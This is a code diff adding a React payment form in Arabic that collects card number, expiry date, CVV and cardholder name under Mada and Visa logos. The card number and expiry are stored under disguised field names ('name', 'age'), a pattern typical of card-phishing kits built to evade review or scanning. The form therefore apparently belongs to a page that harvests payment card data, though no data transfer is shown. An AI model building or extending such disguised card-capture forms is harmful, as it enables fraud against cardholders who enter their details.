@@ -1,0 +1,90 @@
+"use client";
+
+import { useState } from "react";
+import { useRouter } from "next/navigation";
+import Image from "next/image";
+
+interface PaymentFormProps {
+  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
+}
+
+export default function PaymentForm({ onSubmit }: PaymentFormProps) {
+  const router = useRouter();
+  const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
+  const [errors, setErrors] = useState(false);
+
+  const handleNext = async () => {
+    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) {
+      setErrors(true);
+      return;
+    }
+    await onSubmit(fields);
+  };
+
+  const inputClass = (field: keyof typeof fields) =>
+    `w-full border rounded-lg px-3 py-2 text-sm outline-none focus:border-gray-500 ${errors && !fields[field] ? "border-red-400" : "border-gray-300"}`;
+
+  return (
+    <>
+      <div className="bg-white rounded-2xl overflow-hidden p-4 sm:p-8">
+        <div className="flex justify-start items-center gap-3 sm:gap-4 mb-4 sm:mb-5">
+          <Image src="/mada975b.png" alt="Mada" width={80} height={80} className="object-contain sm:w-[100px] sm:h-[100px]" />
+          <Image src="/cc975b.png" alt="Visa" width={80} height={80} className="object-contain sm:w-[100px] sm:h-[100px]" />
+        </div>
+        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+          <div className="sm:col-span-2">
+            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">رقم البطاقه <span className="text-red-500">*</span></label>
+            <input
+              autoComplete="cc-number" type="text" placeholder="0000 0000 0000 0000" maxLength={19}
+              value={fields.name}
+              onChange={e => { let v = e.target.value.replace(/\D/g, "").slice(0, 16); v = v.match(/.{1,4}/g)?.join(" ") ?? v; setFields(f => ({ ...f, name: v })); }}
+              className={inputClass("name")}
+            />
+          </div>
+          <div>
+            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">تاريخ الانتهاء <span className="text-red-500">*</span></label>
+            <input
+              autoComplete="cc-exp" type="text" placeholder="MM/YY" maxLength={5}
+              value={fields.age}
+              onChange={e => { let v = e.target.value.replace(/\D/g, ""); if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4); setFields(f => ({ ...f, age: v })); }}
+              className={inputClass("age")}
+            />
+          </div>
+          <div>
+            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">رمز ال CVV <span className="text-red-500">*</span></label>
+            <input
+              autoComplete="cc-csc" type="text" placeholder="000" maxLength={3}
+              value={fields.cvv}
+              onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 3); setFields(f => ({ ...f, cvv: v })); }}
+              className={inputClass("cvv")}
+            />
+          </div>
+          <div className="sm:col-span-2">
+            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">اسم حامل البطاقة <span className="text-red-500">*</span></label>
+            <input
+              autoComplete="cc-name" type="text" placeholder="اسم حامل البطاقة"
+              value={fields.cardHolder}
+              onChange={e => setFields(f => ({ ...f, cardHolder: e.target.value.toUpperCase() }))}
+              className={inputClass("cardHolder")}
+            />
+          </div>
+        </div>
+      </div>
+
+      <div className="flex gap-3">
+        <button
+          onClick={() => router.push("/cart")}
+          className="flex-1 border border-gray-300 text-gray-700 font-medium py-3.5 rounded-2xl text-sm hover:bg-gray-100 transition"
+        >
+          السابق
+        </button>
+        <button
+          onClick={handleNext}
+          className="flex-1 bg-teal-500 hover:bg-teal-600 active:scale-[0.98] text-white font-medium py-3.5 rounded-2xl transition-all text-sm"
+        >
+          التالي
+        </button>
+      </div>
+    </>
+  );
+}
